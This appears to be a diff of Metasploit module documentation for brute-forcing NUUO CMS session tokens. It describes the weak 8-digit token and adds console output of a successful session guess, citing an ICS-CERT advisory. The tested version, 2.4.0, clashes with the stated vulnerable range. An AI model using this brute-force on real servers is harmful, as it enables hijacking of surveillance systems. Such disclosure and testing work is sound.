@@ -1,4 +1,6 @@
-## Nuuo CMS Session Bruteforce
+## Description
+
+Nuuo CMS Session Bruteforce
 
 The NUUO CMS protocol uses session tokens in a similar way to HTTP cookies. As mentioned in the summary, if a USERLOGIN request is sent with a correct username and password, a "User-Session-No" token will be returned. The number returned is composed of 8 digits, so if an attacker wanted to guess it, they would have 10 million possibilities, and would be able to bruteforce it on average after 5 million tries.
 
@@ -41,10 +43,30 @@ Secondly, due to the nature of this application, it is normal to have the softwa
 
 It is worth noticing that when a user logs in, the session has to be maintained by periodically sending a PING request. To bruteforce the session, we send each guess with a PING request until a 200 OK message is received. 
 
-# The following versions were tested:
+## Vulnerable Application
+
+[NUUO Central Management Server (CMS): all versions below 2.4.0](d1.nuuo.com/NUUO/CMS/)
+
  - 1.5.2 OK
  - 2.1.0 OK
  - 2.3.0 OK
+
+## Scenarios
+
+### Tested on Windows 10 Pro x64 running NCS Server v2.4.0
+
+```
+msf5 auxiliary(gather/nuuo_cms_bruteforce) > set rhosts 172.22.222.200
+rhosts => 172.22.222.200
+msf5 auxiliary(gather/nuuo_cms_bruteforce) > exploit
+
+[*] 172.22.222.200:5180 - Bruteforcing session - this might take a while, go get some coffee!
+[*] 172.22.222.200:5180 - Generating 2621440 session tokens
+[+] 172.22.222.200:5180 - Found valid user session: 42094216
+[*] 172.22.222.200:5180 - Time taken: 1384.588721601991 seconds; total tries 590893
+[*] Auxiliary module execution completed
+msf5 auxiliary(gather/nuuo_cms_bruteforce) >
+```
 
 ## References
 https://ics-cert.us-cert.gov/advisories/ICSA-18-284-02
